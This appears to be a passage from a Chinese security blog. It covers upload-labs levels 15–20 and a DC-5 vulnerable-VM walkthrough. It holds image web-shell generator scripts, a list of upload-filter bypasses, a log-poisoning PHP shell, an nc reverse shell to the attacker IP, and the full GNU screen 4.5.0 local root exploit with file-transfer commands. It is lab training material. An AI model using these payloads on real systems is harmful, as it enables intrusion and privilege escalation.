$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } Less-15 本地文件包含 + 图片马 exif_imagetype() exif_imagetype() 同样用13、14关的方法 核心代码 function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } Less-16 本地文件包含 + 图片马 imagecreatefromgif 本关可以参考超详细的文章： upload-labs之pass 16详细分析 先判断文件是否是图片，如果是的话，进行二次渲染 本关就无法使用前 3 关用的图片马了，因为关键的一句话会被去掉，先看一下前面使用的图片马一句话的位置 可以看到一句话在文件末尾，即直接拼接在图片数据后面。将其上传，然后在服务器端看一下上传的图片马 可以看到末尾关键的一句话已经被删掉了。那么本题的挺多种方法，一种方法就是自己去尝试，上传前的 图片马 与 被渲染之后的图片 哪部分相同，说明函数对那部分是不做修改处理，就可以在里面插入 一句话；另一种方法用大佬的脚本生成图片马 PNG &lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,&#39;./1.png&#39;); ?&gt; 运行如上脚本获取PNG图片马 成功上传，然后连接 Ps：如报错Call to undefined function imagecreatetruecolor()，是因为没有开启php的gd库，Linux 安装即可，Windwos 去修改 php.ini sudo apt-get install php-gd JPG &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) { die(&#39;php-gd is not installed&#39;); } if(!isset($argv[1])) { die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&#39;Incorrect SOI marker&#39;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) { die(&#39;Success!&#39;); } else { break; } } } } unlink(&#39;payload_&#39;.$argv[1]); die(&#39;Something\\&#39;s wrong&#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#39;/(\\d+) extraneous bytes before marker/&#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &#39;&#39;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&#39;End Of File&#39;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&#39;End Of File&#39;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; 先上传一张 jpg 图片 到服务器上，然后将其下载下来（被服务器处理完了），然后用脚本处理它 将处理完的图片上传，然后可以通过改变代码中的 payload 来执行不同的语句（后来发现这个代码无法处理太长的 payload和$符号，以及有些代码，只能看实际情况再调整了） &lt;?=var_dump(getcwd());?&gt; 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;]; $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; } } Less-17 条件竞争 上传一句话时抓包，然后在Intruder-&gt;Payload Sets-&gt;Payload type处设置Null payloads，因为我们是重发数据包，没有要改变的 payload。然后设置重发次数，点击Start attack开始重发 在重发的时候浏览器多次访问shell，就可以获取到 核心代码 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传出错！&#39;; } } Less-18 图片马 + 条件竞争 本关需要上传图片马，服务器会对上传的图片马进行重命名，通过条件竞争，在服务器端还未rename的时候访问，不再赘述 核心代码 //index.php $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#39;文件已经被上传，但没有重命名。&#39;; break; case -1: $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;; break; case -2: $msg = &#39;上传失败，上传目录不可写。&#39;; break; case -3: $msg = &#39;上传失败，无法上传该类型文件。&#39;; break; case -4: $msg = &#39;上传失败，上传的文件过大。&#39;; break; case -5: $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;; break; case -6: $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;; break; default: $msg = &#39;未知错误！&#39;; break; } } //myupload.php class MyUpload{ ...... ...... ...... var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); ...... ...... ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-&gt;isUploadedFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;setDir( $dir ); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkExtension(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkSize(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 ){ $ret = $this-&gt;checkFileExists(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); } ...... ...... ...... }; Less-19 move_uploaded_file() 的 %00 截断（CVE-2015-2348） 源码中看到move_uploaded_file()直接使用了我们$_POST[&#39;save_name&#39;]，所以思路从这里入手，想到了%00截断。然后利用pathinfo()处理的后缀，绕过黑名单 加上%00 可以访问并解析 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = &#39;上传出错！&#39;; } }else{ $msg = &#39;禁止保存为该类型文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-20 对文件名处理漏洞 本道题在代码在2019 unctf的simple_upload出现了，关键在于end()、reset()、count()函数处理的不当，导致绕过。 先做个简单测试 这题的关键点在于move_uploaded_file()函数会自动递归删除最后的/.字符串（或者 Windows 环境下自动删除文件名最后的.） move_uploaded_file($temp_name, $img_path) 当我们有传入$_POST[&#39;save_name&#39;]时，并且是一个数组，$file这个变量就可以是一个数组，并且内容随意控制，无需受explode()控制，思路： ① 令数组的最后一个参数为允许的后缀，比如 png ② 令$file[count($file) - 1]为空，这样$file_name等于“数组的第一位 + .”，然后我们使数组的第一位为“文件名 + /”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + /.”，后面的/.就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得$file[count($file) - 1]为空 以上是一种处理方法，如果面对的服务器是搭建在 Windwos 上的，我们可以忽略/，因为 Windwos 本来就会处理掉文件最后面的. 可以访问并解析 核心代码 $is_upload = false; $msg = null; if(!empty($_FILES[&#39;upload_file&#39;])){ //检查MIME $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; if (!is_array($file)) { $file = explode(&#39;.&#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } } }else{ $msg = &quot;请选择要上传的文件！&quot;; } 思路 ① 抓包修改文件后缀（绕过前端验证） ② 抓包修改 Content-Type 字段 ③ 针对黑名单，修改文件后缀为 php3、php5、phtml、php.xxx 等常见绕过黑名单的后缀 ④ 上传 .htaccess 使所有类型文件都解析为 php 文件，然后上传黑名单之外的文件类型 ⑤ 对后缀名没有进行“小写化”处理，可以用 大小写 绕过黑名单（PHP） ⑥ 对后缀名没有进行“去空格”处理，可以用 添加空格 绕过黑名单（.php ） ⑦ 对后缀名没有进行“去点(.)处理”，可以用 尾部添加. 绕过黑名单（.php.） ⑧ 没有对后缀名进行“去 ::$DATA 处理”，可以用尾部添加 ::$DATA 绕过黑名单（.php::$DATA） ⑨ 将 后缀检查 和 上传路径中的文件名 分开的逻辑漏洞，可以构造后缀绕过黑名单构造文件名（.php. .） ⑩ 关键处使用 str_replace() 函数，因为只匹配一次所以可以双写绕过 ①① move_uploaded_file() 的 %00 截断（CVE-2015-2348）导致上传文件名随意控制 ①② %00 如果通过 POST 方式传递，由于 POST 方式不会自动 URL解码 ，所以需要将 %00 编码后传入 ①③ 上传图片马 + 本地文件包含 拿到 shell ①④ getimagesize()、image_type_to_extension() 绕过方法同 13 关 ①⑤ exif_imagetype() 绕过方法同 13 关 ①⑥ 方法一：观察 未上传图片 与 上传后的图片 的相同处，修改相同处为php代码；方法二：大佬的脚本 ①⑦ 先上传，判断后缀不正确后再删除：通过条件竞争访问 ①⑧ 图片马 + 条件竞争 ①⑨ move_uploaded_file() 的 %00 截断（CVE-2015-2348） ②〇 文件名处理漏洞 Reference https://xz.aliyun.com/t/2435#toc-8 https://blog.csdn.net/u011377996/article/details/86776198 http://www.admintony.com/%e5%85%b3%e4%ba%8e%e4%b8%8a%e4%bc%a0%e4%b8%ad%e7%9a%8400%e6%88%aa%e6%96%ad%e5%88%86%e6%9e%90.html","categories":[],"tags":[{"name":"Upload-labs","slug":"Upload-labs","permalink":"https://knlvre.github.io/tags/Upload-labs/"}],"author":"Knlvre"},{"title":"DC-5至DC-8靶机渗透测试","slug":"DC5-DC8靶机渗透测试","date":"2019-09-17T16:00:00.000Z","updated":"2019-10-21T11:13:22.949Z","comments":true,"path":"2019/09/18/DC5-DC8靶机渗透测试/","link":"","permalink":"https://knlvre.github.io/2019/09/18/DC5-DC8靶机渗透测试/","excerpt":"","text":"前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 转载自安全客原文：https://www.anquanke.com/post/id/187876 DC-5环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-5（IP：192.168.43.241） 渗透测试扫到IP之后，继续扫端口，开放80、111和45549端口 root@Knlvre:~# nmap -A -p- 192.168.43.241 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-24 10:21 CST Nmap scan report for dc-5 (192.168.43.241) Host is up (0.00066s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 1.6.2 |_http-server-header: nginx/1.6.2 |_http-title: Welcome 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37784/udp status | 100024 1 38492/udp6 status | 100024 1 45579/tcp status |_ 100024 1 46752/tcp6 status 45579/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:ED:57:59 (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.65 ms dc-5 (192.168.43.241) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.52 seconds 访问80端口，其他页面没有什么有用信息，contact.php页可以提交表单，表单提交到thankyou.php，测试Sql注入和XSS都不存在，扫目录也没有结果。看了大佬文章，目录扫出了footer.php，并且发现thankyou.php的footer每次访问都会改变，直接访问footer.php也是这样，年份在改变 猜测这里是直接调用了footer.php（这里是直接调用，不是写在底部，因为跟 上面一样，每次访问年份都在变化）。应该是使用include()函数来包含了 footer.php文件，这样直接导致了LFI漏洞，下面我们来测试一下漏洞是否真的存在和看一下是否会过滤包含进来的文件，直接用GET加file参数 http://192.168.43.241/thankyou.php?file=/etc/passwd 前面nmap的结果来看，中间件是nginx。并且因为网站的访问记录都会被写入日志当中，所以我们当前访问/var/log/nginx/access.log，可以访问 http://192.168.43.241/thankyou.php?file=/var/log/nginx/access.log 可以看到访问记录都被写进去了，那么我们就可以利用这个写马 Ps：此处不知道为什么不能用eval()函数，写入后没反应 &lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt; 会提示404 Not Found，但是已经成功写入日志，测试一下 /thankyou.php?file=/var/log/nginx/access.log&amp;cmd=id 既然有被执行，现在就可以在攻击机监听端口，靶机那边主动连接 #攻击机 root@Knlvre:~# nc -lvp 3737 listening on [any] 3737 ... #靶机 /thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc -e /bin/bash 192.168.199.133 3737 拿到shell之后还只是www的权限，没有找到任何线索，root照样进不去，准备提权。python拿到交互式shell python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@dc-5:~/html$ 参考别人文章，下载了一款Linux越权检查工具到/tmp目录下，如下 Ps：或者下载到Kali内，以后上传到靶机 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh wget https://www.securitysift.com/download/linuxprivchecker.py #使用方法：两个都下载完之后，python linuxprivchecker.py，就可以了 工具跑完之后给出了很多内容，我们这里关注到SUID文件部分，这里的screen可利用 [+] SUID/SGID Files and Directories -rwsr-xr-x 1 root root 40168 May 18 2017 /bin/su -rwsr-xr-x 1 root root 40000 Mar 30 2015 /bin/mount -rwsr-xr-x 1 root root 27416 Mar 30 2015 /bin/umount -rwsr-xr-x 1 root root 1441352 Apr 19 23:48 /bin/screen-4.5.0 drwxr-s--- 2 mysql adm 4096 Apr 19 23:41 /var/log/mysql drwxr-s--- 2 Debian-exim adm 4096 Apr 19 23:33 /var/log/exim4 ... ... ... searchsploit搜索screen，用这个exploits/linux/local/41154.sh，查看内容 root@Knlvre:~/screen# cat 41154.sh #!/bin/bash # screenroot.sh # setuid screen v4.5.0 local root exploit # abuses ld.so.preload overwriting to get root. # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html # HACK THE PLANET # ~ infodox (25/1/2017) echo &quot;~ gnu/screenroot ~&quot; echo &quot;[+] First, we create our shell and library...&quot; cat &lt;&lt; EOF &gt; /tmp/libhax.c #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!\\n&quot;); } EOF gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c rm -f /tmp/libhax.c cat &lt;&lt; EOF &gt; /tmp/rootshell.c #include &lt;stdio.h&gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL); } EOF gcc -o /tmp/rootshell /tmp/rootshell.c rm -f /tmp/rootshell.c echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot; cd /etc umask 000 # because screen -D -m -L ld.so.preload echo -ne &quot;\\x0a/tmp/libhax.so&quot; # newline needed echo &quot;[+] Triggering...&quot; screen -ls # screen itself is setuid, so... /tmp/rootshell 但是脚本是错的，运行需要执行一些步骤： ①将上面这个bash文件的内容单独复制出来，写入libhax.c文件，然后执行如下命令（记得更改文件路径），会生成一个libhax.so root@Knlvre:~/screen# vi libhax.c root@Knlvre:~/screen# cat libhax.c #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!\\n&quot;); } ②把另一段也复制出来，写入rootshell.c，执行如下命令（同样记得修改路径），会生成一个rootshell文件 root@Knlvre:~/screen# vi rootshell.c root@Knlvre:~/screen# cat rootshell.c #include &lt;stdio.h&gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL); } 编译文件 root@Knlvre:~/screen# gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c ./libhax.c: In function ‘dropshell’: ./libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration] 7 | chmod(&quot;/tmp/rootshell&quot;, 04755); | ^~~~~ root@Knlvre:~/screen# gcc -o ./rootshell ./rootshell.c ./rootshell.c: In function ‘main’: ./rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] 3 | setuid(0); | ^~~~~~ ... ... 修改完之后，需要将这2个文件上传到靶机的/tmp目录下，新学到两种方法： 方法一：利用Python 在服务器端如果拥有Python2环境，可以将当前目录作为根目录，临时搭建一个Web服务器，可以自己指定端口，命令如下 python2 -m SimpleHTTPServer [端口] #Python3环境下：python3 -m http.server [端口] 以本次为例 攻击机端： root@Knlvre:~/screen# python -m SimpleHTTPServer 7373 Serving HTTP on 0.0.0.0 port 7373 ... 靶机端： www-data@dc-5:/tmp$ wget http://192.168.199.133:7373/libhax.so wget http://192.168.199.133:7373/dc5.sh converted &#39;http://192.168.199.133:7373/dc5.sh&#39; (ANSI_X3.4-1968) -&gt; &#39;http://192.168.199.133:7373/dc5.sh&#39; (UTF-8) --2019-09-25 03:23:03-- http://192.168.199.133:7373/dc5.sh Connecting to 192.168.199.133:7373... connected. HTTP request sent, awaiting response... 200 OK Length: 267 [text/x-sh] Saving to: &#39;dc5.sh&#39; dc5.sh 100%[=====================&gt;] 267 --.-KB/s in 0s 2019-09-25 03:23:03 (29.0 MB/s) - &#39;dc5.sh&#39; saved [267/267] 传输完成后，服务器端也会有反馈 root@Knlvre:~/screen# python -m SimpleHTTPServer 7373 Serving HTTP on 0.0.0.0 port 7373 ... 192.168.199.153 - - [24/Sep/2019 18:30:43] &quot;GET /libhax.so HTTP/1.1&quot; 200 - 方法二：利用nc 攻击机端： nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1 #-q 参数表示获取文件后1秒关闭 root@Knlvre:~/screen# nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1 listening on [any] 7373 ... 靶机端： nc 192.168.199.133 7373 &gt; libhax.so 传输完成后，服务器端也会有反馈 root@Knlvre:~/screen# nc -lnvp 7373 &lt; /root/screen/libhax.so -q 1 listening on [any] 7373 ... connect to [192.168.199.133] from (UNKNOWN) [192.168.199.153] 58647 结束 将libhax.so、rootshell下载到/tmp目录下之后 www-data@dc-5:/tmp$ ls libhax.so rootshell 还是照着脚本说的做，提权成功 www-data@dc-5:/tmp$ cd /etc www-data@dc-5:/etc$ umask 000 www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne &quot;\\x0a/tmp/libhax.so&quot; www-data@dc-5:/etc$ screen -ls &#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored. [+] done! No Sockets found in /tmp/screens/S-www-data. www-data@dc-5:/etc$ /tmp/rootshell # id id uid=0(root) gid=0(root) groups=0(root),33(www-data) 查找并查看flag，通关 # find / -name &quot;*flag*&quot; /var/lib/mysql/debian-5.5.flag ... ... /usr/lib/x86_64-linux-gnu/perl/5.20.2/bits/waitflags.ph /root/thisistheflag.txt # cat /root/thisistheflag.txt 888b 888 d8b 888 888 888 888 8888b 888 Y8P 888 888 888 888 88888b 888 888 888 888 888 888Y88b 888 888 .d8888b .d88b. 888 888 888 .d88b. 888d888 888 888 888 888 888 888 Y88b888 888 d88P&quot; d8P Y8b 888 888 888 d88&quot;&quot;88b 888P&quot; 888 .88P 888 888 888 888 Y88888 888 888 88888888 888 888 888 888 888 888 888888K Y8P Y8P Y8P 